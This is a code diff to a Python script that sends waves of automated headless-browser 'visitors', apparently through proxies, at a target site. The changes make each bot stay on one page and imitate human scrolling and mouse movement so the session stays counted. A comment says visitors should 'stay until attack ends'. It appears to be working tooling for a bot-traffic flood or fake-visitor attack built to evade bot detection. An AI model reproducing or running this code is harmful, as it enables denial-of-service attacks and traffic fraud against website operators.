@@ -311,55 +311,56 @@ try:
         # SUCCESS - visitor is IN the site with JS running
         print("OK:entered", flush=True)
         
-        pages = get_links(page)
-        if not pages:
-            pages = [target_url]
-        
-        current_url = target_url
-        pages_visited = 1
         start_time = time.time()
+        interaction_count = 0
         
-        # STAY on site, browse like a real human
+        # STAY on this page - scroll + mouse only (no page navigation!)
+        # This keeps NexaFlow session alive and visitor counted
         while time.time() - start_time < stay_seconds:
-            # Read current page
-            human_scroll(page)
-            human_mouse(page)
-            
-            read_time = random.uniform(15, 45)
-            elapsed = 0
-            while elapsed < read_time and time.time() - start_time < stay_seconds:
-                time.sleep(1)
-                elapsed += 1
-            
-            if time.time() - start_time >= stay_seconds:
-                break
-            
-            # Navigate to another page
-            if pages and len(pages) > 1:
-                candidates = [pp for pp in pages if pp != current_url]
-                next_url = random.choice(candidates) if candidates else random.choice(pages)
-            else:
-                next_url = current_url
-            
             try:
-                page.goto(next_url, wait_until="domcontentloaded", timeout=15000)
-                time.sleep(random.uniform(2, 4))
+                # Scroll down slowly like reading
+                human_scroll(page)
+                interaction_count += 1
                 
-                content = page.content()
-                if not is_challenge(content):
-                    current_url = next_url
-                    pages_visited += 1
-                    new_links = get_links(page)
-                    if new_links:
-                        pages = list(set(pages + new_links))[:25]
-                    print(f"PAGE:{pages_visited}:{current_url[:60]}", flush=True)
-            except:
+                # Wait like reading content (10-30 seconds)
+                read_time = random.uniform(10, 30)
+                waited = 0
+                while waited < read_time and time.time() - start_time < stay_seconds:
+                    time.sleep(1)
+                    waited += 1
+                
+                if time.time() - start_time >= stay_seconds:
+                    break
+                
+                # Move mouse around like a real user
+                human_mouse(page)
+                interaction_count += 1
+                
+                # Scroll back up sometimes
+                if random.random() < 0.3:
+                    try:
+                        page.evaluate("window.scrollTo(0, 0)")
+                        time.sleep(random.uniform(1, 3))
+                    except: pass
+                
+                # Small random wait between interactions
+                pause = random.uniform(3, 10)
+                waited = 0
+                while waited < pause and time.time() - start_time < stay_seconds:
+                    time.sleep(1)
+                    waited += 1
+                
+                # Every 60s print heartbeat so parent knows we're alive
+                elapsed = int(time.time() - start_time)
+                if elapsed > 0 and elapsed % 60 < 5:
+                    print(f"ALIVE:{elapsed}s:interactions_{interaction_count}", flush=True)
+                
+            except Exception as e:
+                # Don't exit on errors - just wait and continue
                 time.sleep(random.uniform(2, 5))
-            
-            if pages_visited >= 30:
-                pages_visited = 0
         
-        print(f"DONE:stayed_{int(time.time() - start_time)}s_pages_{pages_visited}", flush=True)
+        stayed = int(time.time() - start_time)
+        print(f"DONE:stayed_{stayed}s_interactions_{interaction_count}", flush=True)
         
         try: context.close()
         except: pass
@@ -516,9 +517,12 @@ def run_browser_wave(wave_num, site_info, stats, lock, stop_event, wave_size=WAV
     else:
         proxy_url = None
     
-    # Calculate remaining time
+    # Calculate remaining time - visitors should stay until attack ends
     duration_min = int(os.environ.get('DURATION_MIN', '5'))
-    stay_seconds = duration_min * 60
+    attack_start = float(os.environ.get('ATTACK_START_TIME', str(time.time())))
+    elapsed = time.time() - attack_start
+    remaining = (duration_min * 60) - elapsed
+    stay_seconds = max(int(remaining), 60)  # At least 60s stay
     
     # Check current active count
     with lock:
